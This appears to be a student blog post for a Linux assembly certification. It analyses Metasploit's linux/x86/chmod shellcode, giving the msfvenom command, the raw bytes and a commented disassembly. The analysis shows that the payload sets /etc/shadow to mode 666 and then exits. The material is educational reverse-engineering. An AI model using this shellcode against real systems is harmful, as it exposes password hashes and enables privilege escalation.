<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.2: Metasploit chmod Shellcode Analysis</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-120451103-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-120451103-1');
</script>
</head>
<body>
<div class='page'>This is an analysis of Metasploit&#39;s linux/x86/chmod shellcode, generated using the following command:<br /><br /><code>msfvenom -f c -p linux/x86/chmod</code><br /><br /><a href=""><img src="images/11-1.png" alt="images/11-1.png" /></a><br /><br />This command generated the following shellcode:<br /><br />&quot;\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80&quot;<br /><br />It is possible to convert this shellcode to readable i86 assembly through use of the <strong>ndisasm</strong> utility (output truncated):<br /><br /><a href=""><img src="images/11-2.png" alt="images/11-2.png" /></a><br /><br />While in a previous post I broke up Metasploit&#39;s TCP Bind shellcode into a series of code blocks, this shellcode is far more simple. I opted instead to leave it in its full form. I have added pseudocode comments that briefly explain the assembly code.<br /><br /><code>00000000  99                cdq<br />00000001  6A0F              push byte +0xf      ; stack = [15]<br />00000003  58                pop eax             ; eax = 15 (chmod) stack = []<br />00000004  52                push edx            ; stack = [0]<br />00000005  E80C000000        call 0x16           ; jump over this inline string<br />0000000A  2F                das                 ; /<br />0000000B  657463            gs jz 0x71          ; etc<br />0000000E  2F                das                 ; /<br />0000000F  7368              jnc 0x79            ; sh<br />00000011  61                popa                ; a<br />00000012  646F              fs outsd            ; do<br />00000014  7700              ja 0x16             ; w\0<br />00000016  5B                pop ebx             ; ebx = address_of_file; stack = []<br />00000017  68B6010000        push dword 0x1b6    ; stack = [oct 666]<br />0000001C  59                pop ecx             ; ecx = oct 666 stack = []<br />0000001D  CD80              int 0x80            ; invoke chmod<br />0000001F  6A01              push byte +0x1      ; stack = [1]<br />00000021  58                pop eax             ; eax = 1<br />00000022  CD80              int 0x80            ; invoke exit() syscall</code><br /><br />This shellcode loads the Linux system call number 15 into EAX, indicating that it will call the <strong>chmod</strong> function (as you&#39;d expect).<br /><br /><a href=""><img src="images/11-3.png" alt="images/11-3.png" /></a><br /><br />Most prominent in the shellcode is an inline string that represents the path to the file chmod will be called on. As you can see above, ndisasm interprets these bytes as instructions, but they actually form the string &quot;/etc/shadow&quot;. When the <code>call</code> instruction at address 0005 is executed, the address of this string is pushed onto the stack and the flow of control will be directed to address 0016. <br /><br />The shellcode then saves the address of the string in EBX, satisfying the &quot;pathname&quot; parameter shown in the function declaration above. Then ECX is loaded with the hex equivalent of octal 666, satisfying the &quot;mode&quot; parameter. The chmod system call is then invoked through the use of an interrupt.<br /><br />Finally, the shellcode invokes the <strong>exit</strong> system call to end the current process.<br /><br />---<br /><br /><em>This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:<br /></em><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><em><br />Student ID: SLAE - 1353</em></div>
</body>
</html>
